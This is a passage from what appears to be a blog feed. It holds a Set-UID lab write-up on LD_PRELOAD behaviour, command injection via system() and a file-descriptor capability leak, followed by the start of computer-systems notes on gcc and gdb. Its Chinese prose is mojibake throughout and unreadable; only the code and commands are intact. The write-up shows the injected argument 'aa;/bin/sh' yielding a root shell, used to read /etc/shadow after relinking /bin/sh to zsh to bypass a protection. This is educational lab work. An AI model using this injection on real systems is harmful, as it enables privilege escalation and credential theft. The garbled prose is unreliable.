çš„sleepç¨‹åº</p></li><li><p>å°†myprogè®¾ç½®ä¸ºå…·æœ‰rootæƒé™çš„set-UIDç¨‹åºåå†æ¬¡æ‰§è¡Œ</p><p><img src="/posts/3c8e3d23/image-20211022172502079.png" alt="image-20211022172502079"></p><p>ç¨‹åºè¡Œä¸ºæ­£å¸¸ï¼Œæ­£å¸¸è°ƒç”¨äº†libä¸­çš„sleepè¯­å¥ ï¼Œç¡çœ äº†1såè¿”å›ã€‚</p></li><li><p>åœ¨rootæƒé™ä¸‹å†æ¬¡export LD_LIBRARYå˜é‡ï¼Œç„¶åå†æ¬¡æ‰§è¡Œ</p><p><img src="/posts/3c8e3d23/image-20211022182847388.png" alt="image-20211022182847388"></p><p>å‘ç°ç¨‹åºè¡Œä¸ºå†æ¬¡è¢«æ”¹å˜ï¼Œè°ƒç”¨äº†mylib.c çš„sleepç¨‹åº</p></li><li><p>è¦æ±‚åœ¨å¦ä¸€ä¸ªç”¨æˆ·ä¸‹è¿è¡Œseedç”¨æˆ·çš„set-UIDç¨‹åºï¼Œå¹¶é‡æ–°export LD_LIBRARYå˜é‡</p><p>é¦–å…ˆåˆ©ç”¨<code>sudo su</code> è¿›å…¥rootç”¨æˆ·</p><p>ç„¶åç”¨<code>sudo adduser seed2</code> åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·seed2</p><p>ç„¶å<code>su seed2</code>åˆ‡æ¢åˆ° seed2</p><p><img src="/posts/3c8e3d23/image-20211022185658486.png" alt="image-20211022185658486"></p><p>è¿è¡Œrootæƒé™çš„set-UIDç¨‹åºï¼Œç¨‹åºæ­£å¸¸æ‰§è¡Œlibåº“çš„sleepå‡½æ•°ï¼Œç¡çœ 1s</p><p><img src="/posts/3c8e3d23/image-20211022190037146.png" alt="image-20211022190037146"></p><p>è¿”å›seedç”¨æˆ·ï¼Œå°†ç¨‹åºæ”¹ä¸ºseedç”¨æˆ·çš„ç‰¹æƒç¨‹åºï¼Œç„¶åé‡æ–°é‡æ–°export LD_LIBRARYå˜é‡</p><p>è¿è¡Œï¼Œç¨‹åºä¾æ—§æ­£å¸¸æ‰§è¡Œlibåº“çš„sleepå‡½æ•°ï¼Œç¡çœ 1s</p><p><img src="/posts/3c8e3d23/image-20211022190532236.png" alt="image-20211022190532236"></p></li></ul><h3 id="step-3-4"><a class="markdownIt-Anchor" href="#step-3-4"></a> Step 3</h3><p>LinuxåŠ¨æ€é“¾æ¥å™¨ä¼šåœ¨ä¸€äº›é»˜è®¤ç›®å½•ä¸­å¯»æ‰¾ç¨‹åºæ‰€ä½¿ç”¨çš„åº“ï¼Œç”¨æˆ·å¯ä»¥åœ¨LD_PRELOADå’ŒLD_LIBRARY_PATHç¯å¢ƒå˜é‡æ¥å¢åŠ æ–°çš„æœç´¢ç›®å½•å’Œåº“æ–‡ä»¶</p><p>æˆ‘ä»¬è®¾ç½®äº†LD_PRELOADåå¯ä»¥è®©é“¾æ¥å™¨å°†sleep()å‡½æ•°å’Œæˆ‘ä»¬çš„ä»£ç mylib.cè¿æ¥èµ·æ¥ï¼Œè€Œä¸æ˜¯å’Œæ ‡å‡†åº“libcåº“ä¸­çš„sleep()å‡½æ•°é“¾æ¥èµ·æ¥ã€‚</p><p>æ‰€ä»¥è¿™å¯¼è‡´ç¬¬ä¸€ç§æƒ…å†µä¸‹æ­£å¸¸è¿è¡Œmyprogç¨‹åºè¡Œä¸ºçš„æ”¹å˜</p><p>è€Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç¨‹åºæ”¹ä¸ºrootæƒé™çš„ç‰¹æƒç¨‹åºåæ­£å¸¸æ‰§è¡Œï¼Œè¿™æ˜¯å› ä¸ºåŠ¨æ€é“¾æ¥åº“çš„ä¸€äº›é˜²å¾¡æªæ–½ï¼Œå½“è¿›ç¨‹çš„çœŸå®ç”¨æˆ·IDå’Œæœ‰æ•ˆç”¨æˆ·IDä¸ä¸€æ ·ï¼Œè¿›ç¨‹å°†å¿½ç•¥LD_PRELOADç¯å¢ƒå˜é‡ã€‚</p><p>åœ¨ç¬¬ä¸‰ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç”¨æˆ·æ”¹ä¸ºroot, ç„¶ååœ¨è¿è¡Œå…·æœ‰rootæƒé™çš„ç‰¹æƒç¨‹åºåï¼Œç¨‹åºå†æ¬¡æ”¹å˜äº†è¡Œä¸ºï¼Œè°ƒç”¨äº†mylib.cä»£ç ï¼Œè¿™æ˜¯å› ä¸ºçœŸå®ç”¨æˆ·IDå’Œæœ‰æ•ˆç”¨æˆ·IDä¸€æ ·ï¼Œå¯¼è‡´é˜²å¾¡æªæ–½å¤±æ•ˆäº†</p><p>åœ¨ç¬¬å››ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç”¨æˆ·æ”¹ä¸ºseed2ï¼ŒæŒºå¥½è¿è¡Œç„¶ååœ¨è¿è¡Œå…·æœ‰seedç”¨æˆ·çš„ç‰¹æƒç¨‹åºï¼Œç¨‹åºä¾æ—§æ­£å¸¸æ‰§è¡Œï¼Œé˜²å¾¡æªæ–½æœ‰æ•ˆã€‚</p><p><strong>å®éªŒéªŒè¯</strong></p><p><img src="/posts/3c8e3d23/image-20211022192624573.png" alt="image-20211022192624573"></p><p>æˆ‘ä»¬å¤åˆ¶eveåˆ° å½“å‰ç›®å½•ä¸ºmyenvï¼Œç„¶åå°†å…¶è®¾ç½®ä¸ºrootæƒé™çš„ç‰¹æƒç¨‹åºï¼Œä¹‹åè®¾ç½®ä¸‰ä¸ªLDå˜é‡ï¼Œç”¨envæ‰“å°ï¼Œå¯ä»¥å‘ç°ä¸‰ä¸ªå˜é‡éƒ½å‡ºç°äº†ï¼Œç”¨myenvæ‰“å°å‘ç°åªå‡ºç°äº†ä¸€ä¸ªå˜é‡LD_MYOWN</p><p>è¿™å°±æ˜¯å› ä¸ºé‚£ä¸¤ä¸ªå˜é‡å¯¹åŠ¨æ€é“¾æ¥å™¨çš„è¡Œä¸ºä¼šäº§ç”Ÿå½±å“ï¼Œæ‰€ä»¥ä»–ä»¬åœ¨Set-UIDç¨‹åºä¸­è¢«å±è”½äº†ï¼Œä»è€Œä¸ä¼šå†å¯¹ç‰¹æƒç¨‹åºçš„åŠ¨æ€é“¾æ¥äº§ç”Ÿä»»ä½•å½±å“ï¼Œè€ŒLD_MYOWNæ˜¯è‡ªå·±å®šä¹‰çš„ï¼Œä¸ä¼šè¢«åŠ¨æ€é“¾æ¥å™¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ²¡æœ‰å®‰å…¨å¨èƒï¼Œå› æ­¤æ²¡æœ‰è¢«å±è”½ã€‚</p><h2 id="task-8"><a class="markdownIt-Anchor" href="#task-8"></a> Task 8</h2><h3 id="step-1-5"><a class="markdownIt-Anchor" href="#step-1-5"></a> Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-built_in">system</span>(command);<br>    <span class="hljs-comment">//execve(v[0],v,NULL);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¼–è¯‘catallæ–‡ä»¶ï¼Œç„¶åå°†å…¶è®¾ç½®ä¸ºrootæƒé™çš„ç‰¹æƒç¨‹åº</p><p><img src="/posts/3c8e3d23/image-20211022195314688.png" alt="image-20211022195314688"></p><p>æ‰§è¡Œå¦‚ä¸‹å›¾æ‰€ç¤ºçš„æŒ‡ä»¤ï¼Œå¯ä»¥å‘ç°ç¨‹åºåˆ›å»ºäº†ä¸€ä¸ªshellè¿›ç¨‹ï¼Œä½†æœ€å¼€å§‹æˆ‘ä»¬åªå¾—åˆ°äº†ä¸€ä¸ªæ™®é€šçš„shellç¨‹åºï¼Œè¿™æ˜¯ç”±äºUbuntu20.04çš„ä¸€ä¸ªä¿æŠ¤æœºåˆ¶å¯¼è‡´çš„ï¼Œæˆ‘ä»¬é‡‡ç”¨</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br></code></pre></div></td></tr></table></figure><p>æ¥ä½¿å¾—/bin/shæŒ‡å‘/bin/zsh</p><p>å†æ¬¡è°ƒç”¨catall â€œaa;/bin/sh&quot;ï¼Œæˆ‘ä»¬å‘ç°è¿™æ¬¡åˆ›å»ºäº†ä¸€ä¸ªå…·æœ‰rootæƒé™çš„shellè¿›ç¨‹ï¼Œç”¨cat  /etc/shadow æŒ‡ä»¤éªŒè¯ï¼Œå‘ç°æˆåŠŸè¾“å‡ºå¯†ç ï¼Œè¯´æ˜æˆ‘ä»¬æƒé™çªƒå–æˆåŠŸã€‚</p><p><img src="/posts/3c8e3d23/image-20211022195229974.png" alt="image-20211022195229974"></p><p><img src="/posts/3c8e3d23/image-20211022200809708.png" alt="image-20211022200809708"></p><h3 id="step-2-5"><a class="markdownIt-Anchor" href="#step-2-5"></a> Step 2</h3><p>æ³¨é‡Šæ‰system()ï¼Œå–æ¶ˆæ³¨é‡Šexecve()</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-comment">//system(command);</span><br>    <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>],v,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¼–è¯‘ä¿®æ”¹åçš„ä»£ç ä¿å­˜ä¸ºsafecatall</p><p>ä¾æ—§å°†å…¶è®¾ç½®ä¸ºrootæƒé™çš„ç‰¹æƒç¨‹åºï¼Œå†æ¬¡è¿è¡Œ<code>safecatall â€œaa;/bin/sh&quot;</code>æˆ‘ä»¬å‘ç°ç¨‹åºæ²¡æœ‰å‡ºç°é”™è¯¯</p><p><img src="/posts/3c8e3d23/image-20211022201948533.png" alt="image-20211022201948533"></p><p>ç¬¬ä¸€æ­¥ä¸­æˆ‘ä»¬å¾—åˆ°rootæƒé™çš„åŸå› æ˜¯å› ä¸ºsystem(command)å‡½æ•°æ˜¯é€šè¿‡è°ƒç”¨&quot;/bin/sh -c command&quot;å®ŒæˆcommandæŒ‡ä»¤çš„ï¼Œæ¢å¥è¯è¯´ï¼Œå¤–éƒ¨æŒ‡ä»¤ä¸æ˜¯ä¸Šè¿°ç¨‹åºç›´æ¥æ‰§è¡Œçš„ï¼Œè€Œæ˜¯shellç¨‹åºé¦–å…ˆè¢«æ‰§è¡Œï¼Œç„¶åshellå°†commandä½œä¸ºè¾“å…¥å¹¶è§£æã€‚ä½†æ˜¯å› ä¸ºshellè¿‡äºå¼ºå¤§ï¼Œå®ƒå¯ä»¥è§£æç”¨åˆ†å·éš”å¼€çš„ä¸¤æ¡å‘½ä»¤ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥ â€œaa;/bin/sh&quot;æ˜¯ï¼Œåˆ†å·åé¢çš„æŒ‡ä»¤ä¹Ÿè¢«è§£æå¹¶æ‰§è¡Œäº†ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªrootæƒé™çš„shellã€‚</p><p>è€Œä½¿ç”¨execve()å‡½æ•°åˆ™ä¸ä¼šå¦‚æ­¤ï¼Œå› ä¸ºå®ƒä¼šæŠŠé‚£æ•´ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œæ‰€ä»¥ä¸ä¼šå‘ç”Ÿæƒé™æ³„éœ²çš„æƒ…å†µã€‚</p><h2 id="task-9"><a class="markdownIt-Anchor" href="#task-9"></a> Task 9</h2><p>cap_leak.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fd;<br>  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  <span class="hljs-built_in">setuid</span>(<span class="hljs-built_in">getuid</span>());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>; v[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>], v, <span class="hljs-number">0</span>);                             <br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å±•ç¤ºäº†ä¸€ä¸ªrootç”¨æˆ·çš„Set-UIDç¨‹åºã€‚ç¨‹åºè¿è¡Œåˆ†ä¸ºä¸‰æ­¥ã€‚ç¬¬ä¸€æ­¥ï¼Œå®ƒæ‰“å¼€äº†ä¸€ä¸ªåªæœ‰rootç”¨æˆ·å¯ä»¥ä¿®æ”¹çš„æ–‡ä»¶/etc/zzã€‚åœ¨æ–‡ä»¶è¢«æ‰“å¼€åï¼Œç¨‹åºå®šä¹‰äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¯¥æ–‡ä»¶æè¿°ç¬¦å®Œæˆåç»­å¯¹æ–‡ä»¶çš„æ“ä½œã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯æƒé™çš„ä¸€ç§å½¢å¼ï¼Œä»»ä½•æ‹¥æœ‰å®ƒçš„äººéƒ½å¯ä»¥è®¿é—®å¯¹åº”çš„æ–‡ä»¶ã€‚ç¬¬äºŒæ­¥ï¼Œé€šè¿‡å°†æœ‰æ•ˆç”¨æˆ·ID(roo)å˜å¾—è·ŸçœŸå®ç”¨æˆ·IDä¸€æ ·ï¼Œç¨‹åºé™ä½äº†è‡ªèº«çš„æƒé™ï¼Œå®é™…ä¸Šç›¸å½“äºæ”¾å¼ƒäº†è¿›ç¨‹çš„rootç‰¹æƒã€‚ç¬¬ä¸‰æ­¥ï¼Œç¨‹åºè°ƒç”¨äº†ä¸€ä¸ª shell ç¨‹åº</p><p>ç„¶è€Œä¸Šè¿°ç¨‹åºå¿˜è®°äº†å…³é—­æ–‡ä»¶ï¼Œæ–‡ä»¶æè¿°ç¬¦ä»ç„¶æœ‰æ•ˆï¼Œå› æ­¤è¿™ä¸ªéç‰¹æƒè¿›ç¨‹ä»ç„¶å¯ä»¥ä¿®æ”¹/etc/zzzæ–‡ä»¶ã€‚ä»ç¨‹åºçš„æ‰§è¡Œç»“æœæ¥çœ‹ï¼Œå¯ä»¥å‘ç°æ–‡ä»¶æè¿°ç¬¦çš„å€¼æ˜¯3.é€šè¿‡echo&gt;&amp;3â€å‘½ä»¤å¯ä»¥ä¿®æ”¹/etc/zzæ–‡ä»¶ã€‚è¿™é‡Œâ€œ&amp;3â€è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦3. åœ¨è¿è¡Œè¿™ä¸ª SET-UIDç¨‹åºä¹‹å‰ï¼Œæ— æ³•ä¿®æ”¹å—ä¿æŠ¤çš„/ete/zzæ–‡ä»¶ã€‚ä½†æ˜¯é€šè¿‡ SET-UIDç¨‹åºè·å¾—æ–‡ä»¶æè¿°ç¬¦åï¼Œå¯ä»¥æˆåŠŸåœ°ä¿®æ”¹è¯¥æ–‡ä»¶ã€‚</p><p><img src="/posts/3c8e3d23/image-20211022204515258.png" alt="image-20211022204515258"></p><p>ä¸ºäº†ä¿®å¤è¯¥ç¨‹åºä¸­çš„æƒé™æ³„éœ²é—®é¢˜ï¼Œåº”è¯¥åœ¨é™ä½ç‰¹æƒä¹‹å‰å…ˆé”€æ¯æƒé™ï¼Œç”¨close(fd)å…³é—­æ–‡ä»¶æè¿°ç¬¦å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>è½¯ä»¶å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¯ä»¶å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºç³»ç»Ÿç¬”è®°</title>
    <link href="/posts/e0eae192/"/>
    <url>/posts/e0eae192/</url>
    
    <content type="html"><![CDATA[<h1 id="è®¡ç®—æœºç»„æˆåŸç†"><a class="markdownIt-Anchor" href="#è®¡ç®—æœºç»„æˆåŸç†"></a> è®¡ç®—æœºç»„æˆåŸç†</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a class="markdownIt-Anchor" href="#åŸºç¡€çŸ¥è¯†"></a> åŸºç¡€çŸ¥è¯†</h2><p><img src="/posts/e0eae192/image-20210414171144939.png" alt="image-20210414171144939"></p><p><img src="/posts/e0eae192/image-20210414171238561.png" alt="image-20210414171238561"></p><ul><li><p>ç»ˆç«¯</p><p>.c  -&gt;  .i    (é¢„å¤„ç†)   gcc -E hello.c -o hello.i</p><p>.i   -&gt;  .sï¼ˆæ±‡ç¼–è¯­è¨€ï¼‰     gcc -S hello.o -o hello.s</p><p>.s  -&gt;  .oï¼ˆæœºå™¨ä»£ç ï¼‰ gcc -c  hello.o -o hello.o</p><p>æŸ¥çœ‹.o    objdump hello.o</p><p>å˜æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé“¾æ¥ï¼‰   gcc hello.o -o hello</p></li></ul><hr><h2 id="ç¬¬äºŒç« -æ±‡ç¼–å…¥é—¨"><a class="markdownIt-Anchor" href="#ç¬¬äºŒç« -æ±‡ç¼–å…¥é—¨"></a> ç¬¬äºŒç«  æ±‡ç¼–å…¥é—¨</h2><h3 id="é€šç”¨å¯„å­˜å™¨"><a class="markdownIt-Anchor" href="#é€šç”¨å¯„å­˜å™¨"></a> é€šç”¨å¯„å­˜å™¨</h3><p><img src="/posts/e0eae192/image-20210315165706496.png" alt="image-20210315165706496"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316104330207.png" alt="image-20210316104330207"></p><h3 id="æ•°æ®ä¼ é€"><a class="markdownIt-Anchor" href="#æ•°æ®ä¼ é€"></a> æ•°æ®ä¼ é€</h3><p><img src="/posts/e0eae192/image-20210315165822191.png" alt="image-20210315165822191"></p><h3 id="å¯»å€æ–¹å¼"><a class="markdownIt-Anchor" href="#å¯»å€æ–¹å¼"></a> å¯»å€æ–¹å¼</h3><p><img src="/posts/e0eae192/image-20210316111854447.png" alt="image-20210316111854447"></p><p><img src="/posts/e0eae192/image-20210316112953982.png" alt></p><h3 id="gdb-x-å‘½ä»¤è¯¦è§£"><a class="markdownIt-Anchor" href="#gdb-x-å‘½ä»¤è¯¦è§£"></a> gdb x å‘½ä»¤è¯¦è§£</h3><p>æ ¼å¼ï¼šx/&lt;n/f/u&gt; <addr></addr></p><p><strong>n</strong>:</p><p>æ˜¯æ­£æ•´æ•°ï¼Œè¡¨ç¤ºéœ€è¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œå³ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºnä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ï¼Œä¸€ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±ç¬¬ä¸‰ä¸ªå‚æ•°uå®šä¹‰ã€‚</p><p><strong>f</strong>:</p><p>è¡¨ç¤ºaddræŒ‡å‘çš„å†…å­˜å†…å®¹çš„è¾“å‡ºæ ¼å¼ï¼Œså¯¹åº”è¾“å‡ºå­—ç¬¦ä¸²ï¼Œæ­¤å¤„éœ€ç‰¹åˆ«æ³¨æ„è¾“å‡ºæ•´å‹æ•°æ®çš„æ ¼å¼ï¼š</p><p>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚</p><p>o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p><strong>u</strong>:</p><p>å°±æ˜¯æŒ‡ä»¥å¤šå°‘ä¸ªå­—èŠ‚ä½œä¸ºä¸€ä¸ªå†…å­˜å•å…ƒ-unit,é»˜è®¤ä¸º4ã€‚å½“ç„¶uè¿˜å¯ä»¥ç”¨è¢«ä¸€äº›å­—ç¬¦è¡¨ç¤ºï¼Œå¦‚b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:è¡¨ç¤ºå†…å­˜åœ°å€ã€‚</addr></p><p>æ•´åˆè¿™ä¸ªå‘½ä»¤çš„è¯ é‡Šï¼šå°±æ˜¯ä»¥addrä¸ºèµ·å§‹åœ°å€ï¼Œè¿”å›nä¸ªå•å…ƒçš„å€¼ï¼Œæ¯ä¸ªå•å…ƒå¯¹åº”uä¸ªå­—èŠ‚ï¼Œè¾“å‡ºæ ¼å¼æ˜¯fã€‚</p><p>å¦‚ï¼šx/ 3uh 0x54320è¡¨ç¤ºï¼šä»¥åœ°å€0x54320ä¸ºèµ·å§‹åœ°å€ï¼Œè¿”å›3ä¸ªå•å…ƒçš„å€¼ï¼Œæ¯ä¸ªå•å…ƒæœ‰ä¸¤ä¸ªå­—èŠ‚ï¼Œè¾“å‡ºæ ¼å¼ä¸ºæ— ç¬¦å·åå…­è¿›åˆ¶ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´è¿”å›äº†3*2=6ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä»¥åå…­è¿›åˆ¶è¾“å‡ºï¼Œè¿™6ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œæ¯ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•å…ƒè¾“å‡ºï¼Œå…±è¾“å‡º3ä¸ªå•å…ƒã€‚</p><h3 id="æ ˆæ“ä½œæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ ˆæ“ä½œæŒ‡ä»¤"></a> æ ˆæ“ä½œæŒ‡ä»¤</h3><p><img src="/posts/e0eae192/image-20210315190744590.png" alt="image-20210315190744590"></p><p>æ ˆé¡¶æ˜¯æœç€ä½åœ°å€æ–¹å‘ç”Ÿé•¿</p><h3 id="ç®—æœ¯é€»è¾‘è¿ç®—æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#ç®—æœ¯é€»è¾‘è¿ç®—æŒ‡ä»¤"></a> 